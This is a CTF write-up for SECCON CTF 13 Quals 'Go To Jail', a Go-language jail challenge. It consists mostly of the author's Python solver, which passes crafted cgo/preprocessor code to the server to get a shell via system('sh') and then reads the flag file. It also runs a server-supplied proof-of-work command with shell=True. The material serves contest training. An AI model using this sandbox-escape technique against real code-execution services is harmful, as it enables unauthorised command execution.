---
title: "Go To Jail - SECCON CTF 13 Quals 2024"
category: "misc"
subcategory: "pow"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "proof-of-work", "subprocess", "misc", "seccon-ctf-13-quals"]
summary: "ʕ◔ϖ◔ʔ Go Language Jail Challenge ʕ◔ϖ◔ʔ"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/go-to-jail"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Quals"
  year: 2024
  challenge: "Go To Jail"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/go-to-jail>
- **CTF:** SECCON CTF 13 Quals 2024

---

# [jail] Go to Jail

## Description

ʕ◔ϖ◔ʔ Go Language Jail Challenge ʕ◔ϖ◔ʔ

```
nc go-to-jail.seccon.games 5000
```

## Attachments

- [go-to-jail](files)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it \
    -e SECCON_HOST=localhost \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/go-to-jail/solver/exploit.py>

```python
import pwn
import os
import subprocess
import time

pwn.context.log_level = "debug"

code = """
//\\
package main
/*#define main
#include"main.go"
__attribute__ func func constructor))f func)<%system func"sh");}*///\\
import "C"//\\
/*
#define/**/func main(//\\
){}
""".strip()
print(f"len: {len(code)}")  # 165

io = pwn.remote(
    os.getenv("SECCON_HOST", "localhost"),
    os.getenv("SECCON_PORT", "5000"),
)

# PoW
pow_cmd = io.recvuntil(b"solution: ").decode().splitlines()[1]
io.sendline(subprocess.run(pow_cmd, shell=True, capture_output=True).stdout)

# Exploit
io.recvuntil(b":")
for line in code.splitlines():
    io.sendline(line.encode())
io.sendline(b"__EOF__")
time.sleep(1)

io.sendline(b"cat /flag-*.txt")
io.sendline(b"exit")

print(io.recvuntil(b"Executed").decode().strip())
```
